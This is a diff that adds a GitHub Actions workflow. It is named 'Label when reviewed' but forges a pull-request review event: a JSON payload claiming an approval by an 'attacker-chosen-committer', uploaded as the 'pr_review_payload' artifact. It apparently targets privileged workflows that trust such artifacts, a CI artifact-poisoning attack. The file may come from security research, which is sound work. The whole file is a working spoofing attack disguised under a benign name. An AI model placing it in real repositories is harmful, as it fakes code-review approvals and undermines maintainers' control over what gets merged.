@@ -1,0 +1,28 @@
+name: "Label when reviewed"
+
+on: pull_request
+
+permissions:
+  contents: read
+
+jobs:
+  label-when-reviewed:
+    name: "Label PRs when reviewed"
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge PR review payload
+        run: |
+          cat > event.json <<'JSON'
+          {
+            "action": "submitted",
+            "repository": {"id": 0},
+            "pull_request": {"number": 1},
+            "review": {"state": "approved", "user": {"login": "attacker-chosen-committer"}},
+            "sender": {"login": "attacker"}
+          }
+          JSON
+      - name: "Upload PR review Payload"
+        uses: actions/upload-artifact@v4
+        with:
+          path: event.json
+          name: "pr_review_payload"
